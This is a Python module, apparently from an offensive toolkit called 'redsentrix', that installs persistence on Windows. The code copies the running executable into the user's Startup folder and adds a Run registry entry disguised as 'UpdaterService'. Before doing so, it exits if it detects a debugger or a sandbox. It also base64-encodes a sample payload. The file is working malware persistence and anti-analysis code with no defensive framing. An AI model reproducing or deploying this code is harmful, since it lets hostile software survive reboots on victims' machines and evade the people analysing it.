import os
import shutil
import sys
import time
import base64
import ctypes
import winreg
from redsentrix_core.stealth_utils import StealthUtils

class WindowsPersistence:
    def __init__(self):
        self.current_exe = sys.executable

    def is_debugger_present(self):
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0

    def sandbox_sleep_check(self, threshold=1.5):
        start = time.time()
        time.sleep(threshold)
        return (time.time() - start) < threshold

    def get_startup_folder(self):
        return os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

    def copy_to_startup(self):
        try:
            dest_path = os.path.join(self.get_startup_folder(), os.path.basename(self.current_exe))
            shutil.copy2(self.current_exe, dest_path)
            return True, dest_path
        except Exception as e:
            return False, str(e)

    def add_to_registry(self, key_name="UpdaterService"):
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, self.current_exe)
            winreg.CloseKey(reg_key)
            return True, None
        except Exception as e:
            return False, str(e)

    def base64_encode_payload(self, payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    def establish_persistence(self):
        if StealthUtils.is_debugger_present():
            StealthUtils.secure_print("[!] Debugger detected. Exiting.")
            return

        if StealthUtils.sandbox_check():
            StealthUtils.secure_print("[!] Sandbox detected. Exiting.")
            return

        StealthUtils.secure_print("[*] Starting persistence setup...")

        success, result = self.copy_to_startup()
        if success:
            StealthUtils.secure_print(f"[+] Copied to startup: {result}")
        else:
            StealthUtils.secure_print(f"[-] Startup copy failed: {result}")

        success, error = self.add_to_registry()
        if success:
            StealthUtils.secure_print("[+] Registry persistence added.")
        else:
            StealthUtils.secure_print(f"[-] Registry persistence failed: {error}")

        encoded = self.base64_encode_payload("ThisIsASamplePayload")
        StealthUtils.secure_print(f"[+] Encoded payload: {encoded}")


def run():
    persistence = WindowsPersistence()
    persistence.establish_persistence()

